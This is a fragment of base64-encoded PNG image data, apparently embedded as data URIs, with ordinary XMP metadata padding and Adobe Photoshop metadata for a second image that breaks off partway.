CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8P3hwYWNrZXQgZW5kPSJ3Ij8+nVV7AwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAutQTFRFR3BMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA+BAMAAACcvUmpAAA7qWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzIgNzkuMTU5Mjg0LCAyMDE2LzA0LzE5LTEzOjEzOjQwICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgICAgICAgICAgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIgogICAgICAgICAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgICAgICAgICAgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmV4aWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vZXhpZi8xLjAvIj4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNS41IChNYWNpbnRvc2gpPC94bXA6Q3JlYXRvclRvb2w+CiAgICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDE3LTAxLTIwVDA2OjA0OjU0KzAxOjAwPC94bXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhtcDpNb2RpZnlEYXRlPjIwMTctMDYtMDFUMDQ6MDY6MjArMDI6MDA8L3htcDpNb2RpZnlEYXRlPgogICAgICAgICA8eG1wOk1ldGFkYXRhRGF0ZT4yMDE3LTA2LTAxVDA0OjA2OjIwKzAyOjAwPC94bXA6TWV0YWRhdGFEYXRlPgogICAgICAgICA8ZGM6Zm9ybWF0PmltYWdlL3BuZzwvZGM6Zm9ybWF0PgogICAgICAgICA8cGhvdG9zaG9wOkNvbG9yTW9kZT4zPC9waG90b3Nob3A6Q29sb3JNb2RlPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOmNmOWM3M2EwLTBiNjYtNDMwNS1hYzVlLTY3YWVjMGY5ZDI4NzwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAgPHhtcE1NOkRvY3VtZW50SUQ+eG1wLmRpZDo5ZTU5ODdiZC05MzMzLTQzMDUtOWYwYy1hN2NmNWNkMTQzMzc8L3htcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+eG1wLmRpZDo5ZTU5ODdiZC05MzMzLTQzMDUtOWYwYy1hN2NmNWNkMTQzMzc8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAg